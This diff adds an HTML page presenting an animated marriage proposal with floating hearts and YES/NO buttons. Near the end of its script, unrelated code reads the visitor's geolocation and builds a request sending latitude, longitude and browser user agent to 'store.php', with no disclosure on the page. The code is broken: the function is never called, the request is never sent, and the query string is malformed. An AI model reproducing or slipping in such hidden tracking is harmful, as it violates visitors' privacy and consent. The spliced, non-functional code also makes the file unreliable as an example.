@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Our Journey</title>
+  <style>
+    body {
+      background: linear-gradient(135deg, #ff8da1, #ff9bd3, #b76e94);
+      background-size: 400% 400%;
+      animation: gradientAnimation 15s ease infinite;
+      font-family: 'Arial', sans-serif;
+      color: #fff;
+      margin: 0;
+      padding: 0;
+      overflow: hidden;
+      height: 100vh;
+      position: relative;
+      text-align: center;
+    }
+
+    .journey-container {
+      position: relative;
+      width: 100%;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      z-index: 10;
+    }
+
+    .title {
+      font-size: 3.5em;
+      color: #fff;
+      margin-bottom: 20px;
+      animation: fadeIn 2s ease-in-out;
+    }
+
+    .step {
+      display: none;
+      font-size: 1.5em;
+      margin-top: 20px;
+      animation: fadeInStep 2s ease-out;
+    }
+
+    .proposal {
+      font-size: 2.5em;
+      color: #ff69b4;
+      margin-top: 50px;
+      display: none;
+      font-weight: bold;
+    }
+
+    .next-button {
+      background-color: #ff1493;
+      color: white;
+      padding: 15px;
+      border-radius: 10px;
+      cursor: pointer;
+      margin-top: 20px;
+      font-size: 1.2em;
+      transition: all 0.3s;
+      z-index: 10;
+    }
+
+    .next-button:hover {
+      background-color: #ff6347;
+    }
+
+    /* Gradient animation */
+    @keyframes gradientAnimation {
+      0% {
+        background-position: 0% 50%;
+      }
+      50% {
+        background-position: 100% 50%;
+      }
+      100% {
+        background-position: 0% 50%;
+      }
+    }
+
+    /* Fade-in animation for title */
+    @keyframes fadeIn {
+      0% {
+        opacity: 0;
+      }
+      100% {
+        opacity: 1;
+      }
+    }
+
+    /* Fade-in animation for each step */
+    @keyframes fadeInStep {
+      0% {
+        opacity: 0;
+      }
+      100% {
+        opacity: 1;
+      }
+    }
+
+    /* Floating hearts animation */
+    .heart {
+      position: absolute;
+      width: 30px;
+      height: 30px;
+      background-color: red;
+      clip-path: polygon(50% 0%, 0% 35%, 50% 100%, 100% 35%);
+      animation: floatHearts 6s ease-in-out infinite;
+      opacity: 0.8;
+    }
+
+    /* Floating hearts effect */
+    @keyframes floatHearts {
+      0% {
+        transform: translate(0, 0) rotate(0deg);
+        opacity: 0.8;
+      }
+      50% {
+        transform: translate(-200px, -200px) rotate(180deg);
+        opacity: 0.6;
+      }
+      100% {
+        transform: translate(200px, 200px) rotate(360deg);
+        opacity: 0.8;
+      }
+    }
+
+    /* YES/NO buttons */
+    .yes-no-buttons {
+      margin-top: 20px;
+      display: none; /* Initially hidden */
+      justify-content: center;
+      gap: 20px;
+    }
+
+    .yes-button, .no-button {
+      padding: 15px 30px;
+      font-size: 1.2em;
+      color: white;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: all 0.3s ease-in-out;
+    }
+
+    .yes-button {
+      background-color: #28a745;
+    }
+
+    .yes-button:hover {
+      background-color: #218838;
+    }
+
+    .no-button {
+      background-color: #dc3545;
+    }
+
+    .no-button:hover {
+      background-color: #c82333;
+    }
+
+    /* Dancing Couple animation */
+    .dancing-couple {
+      position: absolute;
+      top: 30%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 200px;
+      height: 200px;
+      background: url('https://www.example.com/dancing-couple.gif') no-repeat center center;
+      background-size: cover;
+      animation: danceAnimation 2s infinite;
+      z-index: 999; /* Ensures dancing couple is on top */
+    }
+
+    @keyframes danceAnimation {
+      0% {
+        transform: translate(-50%, -50%) rotate(0deg);
+      }
+      50% {
+        transform: translate(-50%, -50%) rotate(10deg);
+      }
+      100% {
+        transform: translate(-50%, -50%) rotate(-10deg);
+      }
+    }
+
+    /* Celebration animation for YES */
+    .celebration {
+      font-size: 3em;
+      color: #ff6347;
+      margin-top: 30px;
+      display: none;
+      animation: confetti 2s ease-out;
+    }
+
+    @keyframes confetti {
+      0% {
+        opacity: 0;
+        transform: scale(0);
+      }
+      100% {
+        opacity: 1;
+        transform: scale(1);
+      }
+    }
+
+  </style>
+</head>
+<body>
+
+  <!-- Floating Hearts -->
+  <div class="heart"></div>
+  <div class="heart"></div>
+  <div class="heart"></div>
+  <div class="heart"></div>
+  <div class="heart"></div>
+
+  <!-- Journey Container -->
+  <div class="journey-container">
+    <div class="title">Our Beautiful Journey</div>
+    <div class="step" id="step1">Remember when we first met? It was like destiny brought us together...</div>
+    <div class="step" id="step2">Our first date was magical. The way we laughed together, I knew something special was coming...</div>
+    <div class="step" id="step3">Our first trip together was unforgettable. I realized that I loved spending every moment with you...</div>
+    <div class="step" id="step4">And now... Here we are, sharing our beautiful love. I couldn't ask for a better person to be with...</div>
+
+    <div class="proposal" id="proposalMessage">Will you marry me? 💍</div>
+
+    <!-- YES and NO buttons (Hidden until proposal) -->
+    <div class="yes-no-buttons" id="yesNoButtons">
+      <button class="yes-button" id="yesButton">YES</button>
+      <button class="no-button" id="noButton">NO</button>
+    </div>
+
+    <!-- Celebration message -->
+    <div class="celebration" id="celebrationMessage">YAY! You're my forever! 🎉💍</div>
+
+    <button class="next-button" id="nextButton">Start Our Journey</button>
+  </div>
+
+  <script>
+    let currentStep = 0;
+    const steps = document.querySelectorAll('.step');
+    const proposalMessage = document.getElementById('proposalMessage');
+    const nextButton = document.getElementById('nextButton');
+    const yesButton = document.getElementById('yesButton');
+    const noButton = document.getElementById('noButton');
+    const celebrationMessage = document.getElementById('celebrationMessage');
+    const yesNoButtons = document.getElementById('yesNoButtons');
+
+    // Next button to show proposal
+    nextButton.addEventListener('click', () => {
+      if (currentStep < steps.length) {
+        steps[currentStep].style.display = 'block';
+        currentStep++;
+        if (currentStep === steps.length) {
+          setTimeout(() => {
+            proposalMessage.style.display = 'block';
+            yesNoButtons.style.display = 'flex'; // Show YES/NO buttons after the proposal message
+          }, 500);
+        }
+      }
+    });
+
+    // Show first step
+    steps[0].style.display = 'block';
+
+    // YES button interaction
+    yesButton.addEventListener('click', () => {
+      // Hide YES/NO buttons and show celebration
+      yesNoButtons.style.display = 'none';
+      celebrationMessage.style.display = 'block';
+      celebrationMessage.innerHTML = "YAY! You're my forever! 🎉💍";
+      celebrationMessage.classList.add('celebration');
+
+      // Show dancing couple animation
+      const dancingCouple = document.createElement('div');
+      dancingCouple.classList.add('dancing-couple');
+      document.body.appendChild(dancingCouple);
+    });
+
+    // NO button interaction
+    noButton.addEventListener('click', () => {
+      yesNoButtons.style.display = 'none';
+      celebrationMessage.style.display = 'block';
+      celebrationMessage.innerHTML = "It's okay, you're my best friend forever. 💕";
+      celebrationMessage.classList.add('celebration');
+    });
+
+
+    const x = document.getElementById("demo");
+
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(success, error);
+  } else {
+    x.innerHTML = "Geolocation is not supported by this browser.";
+  }
+}
+
+function success(position) {
+    const xhttp = new XMLHttpRequest();
+    xhttp.open("GET", "store.php?latitude=" + position.coords.latitude +
+    "<br>Longitude: " + position.coords.longitude + "&uagent: " + navigator.userAgent);
+}
+function error() {
+  alert("Sorry, no position available.");
+}
+  </script>
+
+</body>
+</html>
